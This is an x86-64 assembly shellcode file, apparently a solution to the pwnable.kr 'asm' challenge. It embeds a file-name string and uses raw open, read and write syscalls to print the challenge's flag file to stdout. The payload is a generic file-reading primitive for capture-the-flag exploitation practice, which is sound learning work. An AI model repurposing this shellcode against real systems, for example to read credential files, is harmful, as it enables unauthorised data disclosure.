.globl _start
.section .text

_start:
    movq %rsp, %rbp
    movq $100, %rbx
    subq %rbx, %rsp
    jmp  label

open:
    popq %rdi
    movq $0, %rsi # O_RDONLY
    movq $2, %rax # open syscall
    syscall

read:
    movl %eax, %edi        # opened fd
    leaq -100(%rbp), %rsi  # data on stack where to read
    movl %ebx, %edx        # size of buffer (100)
    movq $0, %rax          # read syscall
    syscall

    movq %rax, %rbx

write:
    movl $1, %edi          # first argument (stdout descriptor)
    leaq -100(%rbp), %rsi  # second argument (buffer address)
    movl %ebx, %edx        # third argument (size)
    movq $1, %rax          # write syscall code
    syscall

exit:
    movq $60, %rax        # exit syscall
    syscall

label:
    callq open

name:
    .string "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"
